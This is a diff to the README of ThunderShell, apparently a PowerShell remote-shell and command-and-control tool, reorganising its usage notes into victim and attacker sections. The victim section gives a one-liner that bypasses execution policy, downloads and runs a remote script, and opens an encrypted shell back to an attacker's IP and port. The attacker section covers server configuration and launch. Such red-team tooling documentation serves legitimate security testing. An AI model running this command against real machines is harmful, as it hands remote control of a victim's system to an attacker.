@@ -31,17 +31,16 @@ For example if you fetch PowerView.ps1 script it will be fully encrypted over th
 
 # Usage
 
-Configuration:
-Make sure that the  `encryption-key` value in your JSON config file match the PowerShell PS-RemoteShell -Key option.
+## Victim
+`powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://ringzer0team.com/PS-RemoteShell.ps1'); PS-RemoteShell -ip 1.1.1.1 -port 8080 -Key test -Delay 2000`
+ - Make sure that the  `encryption-key` value in your JSON config file match the PowerShell PS-RemoteShell `-Key` option.
+ - If you are using https on the ThunderShell server, add the `-Protocol https` attribute to the PowerShell  PS-RemoteShell launcher. 
 
-Victim:
-```
-powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://ringzer0team.com/PS-RemoteShell.ps1'); PS-RemoteShell -ip 1.1.1.1 -port 8080 -Key test -Delay 2000
-```
 
-Attacker side example:
+## Attacker
+### Configuration
 
-* default.json:
+default.json:
 ```
 {
         "redis-host": "localhost",
@@ -58,7 +57,17 @@ Attacker side example:
         "max-output-timeout": 5
 }
 ```
+If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:
 
+```
+-----BEGIN RSA PRIVATE KEY-----
+... (private key in base64 encoding) ...
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+... (certificate in base64 PEM encoding) ...
+-----END CERTIFICATE-----
+```
+### Launching the server
 ```
 me@debian-dev:~$ python ThunderShell.py default.json
 
